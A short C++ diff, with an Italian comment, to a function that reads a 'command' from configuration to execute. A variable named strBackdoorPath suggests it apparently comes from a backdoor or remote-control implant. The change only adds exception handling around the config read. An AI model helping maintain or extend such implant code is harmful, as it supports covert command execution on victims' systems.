@@ -13,7 +13,12 @@ INT Execute::run() {
 
 	// Espandiamo $dir$ se presente
 	strBackdoorPath = GetCurrentPath(NULL);
-	strExecutePath = conf->getString(L"command");
+
+	try {
+		strExecutePath = conf->getString(L"command");
+	} catch (...) {
+		strExecutePath = L"";
+	}
 
 	if (strExecutePath.empty()) {
 		return 0;
